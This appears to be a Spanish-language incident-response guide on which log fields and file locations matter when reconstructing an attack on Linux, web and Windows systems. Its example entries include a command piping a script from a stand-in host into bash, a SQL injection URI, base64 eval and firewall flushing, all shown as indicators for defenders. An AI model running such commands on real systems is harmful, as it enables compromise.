METODOLOGÍA DFIR

¿Cómo Identificar Evidencias y Campos Clave en Logs?

Durante el análisis forense post-incidente, la cantidad de logs puede ser abrumadora. La clave consiste en filtrar por artefactos sospechosos y analizar la estructura de cada campo para reconstruir la línea temporal del atacante.

Los 8 Campos Fundamentales en una Investigación

Timestamp

Timestamp UTC / Epoch

Permite la correlación temporal exacta entre múltiples servidores y artefactos de red.

Ej: 2026-11-06T14:06:15Z
💡 Busca: Ráfagas inusuales de peticiones en milisegundos (Brute force o Scripts automatizados).
Source IP

IP Origen & Puerto

Identifica el origen del tráfico. Permite buscar en Inteligencia de Amenazas (VirusTotal, AbuseIPDB).

Ej: 198.51.100.77:44321
💡 Busca: IPs públicas sospechosas, proxies TOR, o IPs internas pivotando de manera anómala.
HTTP Status

Código Status HTTP

Revela si el intento de ataque falló o si tuvo éxito al acceder al recurso.

401/403 (Denegado) 200 OK (Éxito)
💡 Patrón: Decenas de respuestas 401/404 seguidas inmediatamente de un 200 OK = Explotación exitosa.
User-Agent

User-Agent Anomalous

Identifica la herramienta cliente utilizada por el atacante o el script malicioso.

sqlmap/1.6#stable / python-requests
💡 Busca: Escáneres automáticos (Nmap, Nikto, Gobuster) o User-Agents vacíos / modificados.
Payload

URI Request / Encodings

La secuencia de caracteres enviada en la URL o cuerpo POST para vulnerar la app.

/api.php?id=1%27%20UNION%20SELECT...
💡 Busca: Codificación Hexadecimal (`%20`, `%27`), Base64 (`eval(base64_decode(...))`), o Path Traversal (`../`).
UID / Account

Usuario Contextual (UID)

Cuenta del sistema en cuyo contexto se ejecutó la acción (www-data, root, administrator).

uid=33(www-data) euid=0(root)
💡 Busca: Alertas de Escalada de Privilegios (procesos de www-data ejecutando `sudo` o `su`).
Audit Exec

Command Execution String

Comando exacto de sistema operativo disparado por el proceso o la webshell.

curl -s http://bad.com/sh | bash
💡 Busca: Descargas automáticas, deshabilitación de firewall (`iptables -F`), recon (`whoami`, `id`, `uname -a`).
PID / PPID

PID & Parent Process ID

Relación padre-hijo de procesos para rastrear el origen de la ejecución sospechosa.

ppid=1420 (nginx) -> pid=8841 (bash)
💡 Anomalia: Un servidor Web (Nginx/Apache) no debería lanzar un intérprete interactivo (`/bin/sh` o `cmd.exe`).

Mapa Interactivo de Rutas y Archivos de Logs

Guía rápida de ubicación física de artefactos según el Sistema Operativo, Servidor Web y SIEM.

Linux System

Linux Autenticación & Accesos

Registra incios de sesión SSH, escalada con sudo, errores de login y PAM.

/var/log/auth.log Debian/Ubuntu
/var/log/secure RHEL/CentOS
Evidencias clave: Intrusiones SSH, ataques de fuerza bruta, ejecución no autorizada de `sudo`.
Web Servers

Nginx & Apache Web Logs

Peticiones HTTP/HTTPS entrantes, respuestas del servidor y errores del engine.

/var/log/nginx/access.log
/var/log/apache2/access.log
/var/log/nginx/error.log
Evidencias clave: SQLi, XSS, upload de WebShells, fuzzing de rutas y peticiones 404/500.
Kernel & Audit

Linux Auditd Framework

Registra syscalls del kernel, ejecución de Binarios, cambios de permisos y archivos.

/var/log/audit/audit.log
/var/log/syslog
dmesg (Kernel Ring Buffer)
Evidencias clave: Comandos ejecutados en el SO (`execve`), modificación de `/etc/shadow`.
Windows OS

Windows Event Log IDs

Visor de eventos de Windows (Security.evtx, System.evtx).

Event ID 4624: Successful Logon
Event ID 4625: Failed Logon
Event ID 4688: Process Creation
Event ID 1102: Audit Log Cleared
Ruta habitual: %SystemRoot%\System32\Winevt\Logs\
SIEM Indexing

Índices en Elastic / Kibana

Nombres estandarizados de índices al consultar un SIEM centralizado.

filebeat-* (Logs de Archivo)
winlogbeat-* (Windows Events)
auditbeat-* (Audit System)
Ventaja: Permite búsquedas masivas KQL / Lucene cruzando servidores en tiempo real.
Linux Artifacts

Históricos y Cron Tasks

Logs de tareas programadas y comandos directos de usuario.

/var/log/cron
~/.bash_history
/var/log/dpkg.log (Paquetes inst.)
Evidencias clave: Instalación de herramientas de hacking, tareas persistence repetitivas.
